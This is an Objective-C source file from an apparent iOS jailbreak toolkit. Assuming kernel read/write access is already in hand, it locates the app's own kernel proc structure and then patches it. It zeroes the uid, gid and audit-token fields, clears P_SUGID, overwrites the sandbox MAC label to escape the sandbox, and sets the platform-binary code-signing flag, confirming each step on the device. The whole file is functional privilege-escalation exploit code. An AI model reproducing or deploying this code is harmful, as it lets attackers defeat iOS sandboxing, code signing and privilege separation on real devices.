//
//  Lum1naElevate.m
//  Lum1na
//

#import "Lum1naElevate.h"
#import "Lum1naStructOffsets.h"
#import "Lum1naBoard.h"
#import "Lum1naKreadLane.h"
#import "Lum1naProcFind.h"
#import "../Exploit/Lum1naCS2Core.h"
#import "../Exploit/LabRuntimeOffsets.h"
#import "../Exploit/LabLocalTime.h"
#import "../Exploit/lumina_core.h"

#include <unistd.h>
#include <stdlib.h>
#include <string.h>

/* XPACI-based kernel pointer unsign, lives in ClearSwordCore/poc.c.
   Identity on arm64. Same local-prototype convention as P069 mach_vm_map. */
extern uint64_t cs2_unpac_ptr(uint64_t kptr);

/* libsystem; CS_OPS_STATUS = 0. */
extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
#define EL_CS_OPS_STATUS 0

#pragma mark - log helper

static void el_log(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[*] %@\n", line];
}
static void el_ok(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[+] %@\n", line];
}
static void el_bad(NSMutableString *s, NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [s appendFormat:@"[-] %@\n", line];
}

#pragma mark - lane cascade (Lum1naKreadLane - shared with P094/P095)

#define el_kread64(a)        Lum1naLaneKRead64(a)
#define el_kread32(a)        Lum1naLaneKRead32(a)
#define el_kwrite64(a, v)    Lum1naLaneKWrite64(a, v)
#define el_kwrite32(a, v)    Lum1naLaneKWrite32(a, v)

/// Kernel zone/dynamic pointer heuristic: procs are zone allocations
/// (0xFFFFFFE0...+ per Dopamine VM_PAGE_PACKED_PTR_BASE), while the
/// allproc list head is static __DATA (0xFFFFFFF0...). The backward walk
/// stops at the head this way.
static BOOL el_looks_zone(uint64_t v) {
    return lumina_kptr_zone(v) != 0;
}
static BOOL el_looks_static(uint64_t v) {
    return lumina_kptr_static(v) != 0;
}
/* XPACI only a pointer that is not already a canonical kernel VA. The
   AGX-RW-iOS-PoC read_pointer() does the same; unconditional XPACI on an
   unsigned canonical pointer can clear its high bits. */
static uint64_t el_unpac(uint64_t v) {
    if (v >= 0xffff000000000000ULL) return v;
    return cs2_unpac_ptr(v);
}

@implementation Lum1naElevate

+ (NSString *)runElevate {
    NSMutableString *s = [NSMutableString string];
    Lum1naBoard *b = [Lum1naBoard shared];
    const LabOffTab *off = LabOff();
    const LabProcOffTab *po = LabProcOff();

    el_log(s, @"=== ELEVATE %@ ===", LabLocalMilitaryNow() ?: @"?");

    if (!b.hasKread || !Lum1naLaneLive()) {
        el_bad(s, @"elevate SKIP - hasKread=%@ lane=%s",
               b.hasKread ? @"YES" : @"NO",
               Lum1naLaneName());
        return s;
    }
    if (!po) {
        el_bad(s, @"elevate SKIP - no struct-offset row for this SKU");
        return s;
    }

    uint64_t slide = b.kslide;
    pid_t mypid = getpid();
    uint64_t selfp = 0;

    if (!po->kernproc && ![b provenKernproc]) {
        /* NOVEL LOCATOR (2026-11-07): no allproc/kernproc symbol needed.
           mach_port_kobject(task_self) -> task_t, then scan the task struct
           for bsd_info (a zone pointer whose +pid is ours and whose
           +proc_ro is a zone pointer). Dopamine's ksymbol(allproc) route
           needs XPF; this route needs only the live kread lane. */
        el_log(s, @"kernproc underived — symbol-free locator");
        NSString *how = nil;
        /* 22G100 socket ladder first: the ClearSword lane already holds the
           rw inpcb KVA. pcb -> socket.so_background_thread -> thread.t_ro ->
           thread_ro.proc (AGX-RW-iOS-PoC 22G100). */
        /* The 22G100 ladder was proven on A18; on A13/A14 the thread/socket
           layout may differ. Default OFF: kobject validates pid+proc_ro.
           Enable with Documents/lum1na_socket_locator once a receipt exists. */
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        BOOL socketLocator = docs && [[NSFileManager defaultManager]
            fileExistsAtPath:[docs stringByAppendingPathComponent:@"lum1na_socket_locator"]];
        if (socketLocator && Lum1naCS2Core_IsLive()) {
            uint64_t pcb = Lum1naCS2Core_RwSocketPcb();
            if (pcb && po->socket_so_background_thread) {
                el_log(s, @"cs2 lane: socket→thread→proc locator (opt-in)");
                selfp = Lum1naFindSelfProcViaSocket(po, (uint32_t)mypid, pcb, &how);
                el_log(s, @"socket locator: %@", how ?: @"?");
            }
        }
        if (!selfp) {
            el_log(s, @"kobject fallback: mach_port_kobject(task) → bsd_info scan");
            selfp = Lum1naFindSelfProc((uint32_t)mypid, po->proc_pid,
                                       po->proc_proc_ro, &how);
            el_log(s, @"kobject locator: %@", how ?: @"?");
        }
        if (!selfp) {
            el_bad(s, @"elevate HOLD - self-proc not located without allproc.");
            el_log(s, @"Fallbacks: tap P094 kernproc derive (catalog p094), or a jailbroken provider.");
            el_log(s, @"uid0/unsandbox/platformize not attempted; AMFI/inject continue sandboxed (expected EPERM).");
            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold"
                                       detail:@"self-proc-not-found" source:@"elevate"];
            return s;
        }
        el_ok(s, @"proc_self = 0x%llx (pid %d, symbol-free)", (unsigned long long)selfp, mypid);
    } else {
        uint64_t kernprocStatic = po->kernproc ? po->kernproc : [b provenKernproc];
        NSString *kpSource = po->kernproc ? @"LabProcOff" : @"p094-proven";
        uint64_t kernproc = kernprocStatic + slide;
        el_log(s, @"kernproc source %@: unslid 0x%llx", kpSource, (unsigned long long)kernprocStatic);

        // 1. find our proc: kernproc is proc 0 (oldest); walk p_list.le_prev
        //    backward. le_prev holds &prev->le_next, and le_next sits at
        //    offset 0, so the value IS the previous proc. When the value is
        //    STATIC (0xFFFFFFF0...) it is &proc0.le_next == proc0 itself
        //    (proc0 is a static kernel global; p_list sits at offset 0).
        if (el_kread32(kernproc + po->proc_pid) != 0) {
            el_bad(s, @"elevate HOLD - kernproc sanity failed (pid!=0 at 0x%llx). VA wrong; keep underived.",
                   (unsigned long long)kernproc);
            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"kernproc-sanity" source:@"elevate"];
            return s;
        }
        uint64_t cur = kernproc;
        for (int i = 0; i < 4096; i++) {
            if (el_kread32(cur + po->proc_pid) == (uint32_t)mypid) { selfp = cur; break; }
            uint64_t prev = el_unpac(el_kread64(cur + po->proc_list_prev));
            if (!prev || prev == cur) break;
            if (el_looks_zone(prev)) { cur = prev; continue; }
            if (el_looks_static(prev)) {
                /* proc0 edge: static le_prev IS proc0's address. */
                if (el_kread32(prev + po->proc_pid) == 0) { cur = prev; continue; }
            }
            break;
        }
        if (!selfp) {
            el_bad(s, @"elevate HOLD - our proc (pid %d) not found in allproc backward walk", mypid);
            [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold" detail:@"proc-not-found" source:@"elevate"];
            return s;
        }
        el_ok(s, @"proc_self = 0x%llx (pid %d)", (unsigned long long)selfp, mypid);
    }

    /* Never write through a locator result that is not our pid. */
    if (selfp && el_kread32(selfp + po->proc_pid) != (uint32_t)mypid) {
        el_bad(s, @"elevate HOLD - locator returned proc 0x%llx with wrong pid",
               (unsigned long long)selfp);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"hold"
                                   detail:@"locator-pid-mismatch" source:@"elevate"];
        return s;
    }

    /* Read-only 22G100 traversal receipt: proc_ro -> task -> vm_map -> pmap.
       This validates the offsets on-device before any pmap write. */
    if (selfp && po->proc_ro_task && po->task_map && po->map_pmap) {
        uint64_t p_ro = el_unpac(el_kread64(selfp + po->proc_proc_ro));
        uint64_t task = el_unpac(el_kread64(p_ro + po->proc_ro_task));
        uint64_t vmap = el_unpac(el_kread64(task + po->task_map));
        uint64_t pmap = el_unpac(el_kread64(vmap + po->map_pmap));
        el_log(s, @"traversal: proc_ro=0x%llx task=0x%llx map=0x%llx pmap=0x%llx",
               (unsigned long long)p_ro, (unsigned long long)task,
               (unsigned long long)vmap, (unsigned long long)pmap);
    }

    // 2. proc -> proc_ro -> ucred
    uint64_t proc_ro = el_unpac(el_kread64(selfp + po->proc_proc_ro));
    uint64_t ucred = el_unpac(el_kread64(proc_ro + po->pro_ro_ucred));
    if (!el_looks_zone(ucred) && !(ucred >= 0xFFFFFFF000000000ULL)) {
        el_bad(s, @"elevate HOLD - ucred 0x%llx implausible", (unsigned long long)ucred);
        return s;
    }
    el_log(s, @"proc_ro=0x%llx ucred=0x%llx", (unsigned long long)proc_ro, (unsigned long long)ucred);

    // 3. uid0/gid0 (DOJailbreaker.elevatePrivileges verbatim set)
    el_kwrite32(selfp + po->proc_svuid, 0);
    el_kwrite32(ucred + po->ucred_svuid, 0);
    el_kwrite32(ucred + po->ucred_ruid, 0);
    el_kwrite32(ucred + po->ucred_uid, 0);
    el_kwrite32(selfp + po->proc_svgid, 0);
    el_kwrite32(ucred + po->ucred_rgid, 0);
    el_kwrite32(ucred + po->ucred_svgid, 0);
    el_kwrite32(ucred + po->ucred_groups, 0);

    // 4. clear P_SUGID so the cred change takes effect.
    //    (Dopamine-tree reads `flag &= P_SUGID`; that is a transcription
    //    artifact - the shipped semantic is clearing the bit.)
    uint32_t flag = el_kread32(selfp + po->proc_flag);
    if (flag & LAB_P_SUGID) {
        el_kwrite32(selfp + po->proc_flag, flag & ~LAB_P_SUGID);
    }

    // 4b. audit_token fix (Dopamine proc_ucred_update_content verbatim):
    //     auditToken = proc_ro + task_tokens + 0x8; uid@+4 gid@+8 ruid@+12
    //     rgid@+16. WITHOUT this the Mach audit token still carries euid
    //     501 - and Dopamine's Root-domain gate reads audit_token_to_euid,
    //     so libkrw/opainject would stay refused even with getuid()==0.
    //     task_tokens is REMOVED on darwin 25+ (26.5) - row value 0 skips.
    if (po->pro_ro_task_tokens) {
        uint64_t auditToken = proc_ro + po->pro_ro_task_tokens + LAB_TASK_TOKEN_AUDIT;
        uint32_t auid = el_kread32(auditToken + LAB_TT_UID_OFF);
        if (auid == (uint32_t)getuid() || auid == 501 || auid == 0) {
            el_kwrite32(auditToken + LAB_TT_UID_OFF,  0);
            el_kwrite32(auditToken + LAB_TT_GID_OFF,  0);
            el_kwrite32(auditToken + LAB_TT_RUID_OFF, 0);
            el_kwrite32(auditToken + LAB_TT_RGID_OFF, 0);
            el_log(s, @"audit_token fixed at proc_ro+0x%x+0x8 (uid/gid/ruid/rgid -> 0)",
                   po->pro_ro_task_tokens);
        } else {
            el_bad(s, @"audit_token uid=%u unexpected - task_tokens offset suspect, fix SKIPPED", auid);
        }
    } else {
        el_log(s, @"task_tokens=0 for this SKU (darwin 25+) - audit fix skipped (token built at exec).");
    }

    if (getuid() != 0 || getgid() != 0) {
        el_bad(s, @"elevate FAIL - uid=%d gid=%d after writes (offsets wrong for this SKU?)", getuid(), getgid());
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"uid-not-zero" source:@"elevate"];
        return s;
    }
    el_ok(s, @"uid=0 gid=0 (verified via getuid/getgid)");

    // 5. unsandbox: mac_label_set(label, 1, -1) semantics =
    //    kwrite64(label + (slot+1)*8, ~0) on proc_ro kernels
    //    (Dopamine kernel.c verbatim shape).
    uint64_t label = el_unpac(el_kread64(ucred + po->ucred_label));
    if (el_looks_zone(label) || label >= 0xFFFFFFF000000000ULL) {
        if (!el_kwrite64(label + 0x10, ~0ULL)) {
            el_bad(s, @"elevate - MAC label write failed at 0x%llx", (unsigned long long)(label + 0x10));
        }
    } else {
        el_bad(s, @"elevate - ucred.label 0x%llx implausible, MAC write skipped", (unsigned long long)label);
    }
    NSError *varErr = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&varErr];
    if (varErr) {
        el_bad(s, @"elevate - unsandbox NOT confirmed: /var unreadable (%@)", varErr.localizedDescription);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"var-unreadable" source:@"elevate"];
        return s;
    }
    el_ok(s, @"unsandboxed - /var readable");
    setenv("HOME", "/var/root", 1);
    setenv("CFFIXED_USER_HOME", "/var/root", 1);
    setenv("TMPDIR", "/var/tmp", 1);

    // 6. platformize: proc_ro.csflags |= CS_PLATFORM_BINARY, verify csops.
    uint32_t csf = el_kread32(proc_ro + po->pro_ro_csflags);
    el_kwrite32(proc_ro + po->pro_ro_csflags, csf | LAB_CS_PLATFORM_BINARY);
    uint32_t live = 0;
    csops(getpid(), EL_CS_OPS_STATUS, &live, sizeof(live));
    if (!(live & LAB_CS_PLATFORM_BINARY)) {
        el_bad(s, @"elevate - CS_PLATFORM_BINARY not visible via csops (wrote 0x%x, read 0x%x)",
               csf | LAB_CS_PLATFORM_BINARY, live);
        [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fail" detail:@"platform-not-set" source:@"elevate"];
        return s;
    }
    el_ok(s, @"CS_PLATFORM_BINARY set (csops 0x%x)", live);

    [[Lum1naBoard shared] recordEvent:@"elevate" kind:@"fire" detail:@"uid0+unsandbox+platform" source:@"elevate"];
    el_ok(s, @"elevate COMPLETE - AMFI/inject/respring now run unsandboxed");
    return s;
}

@end
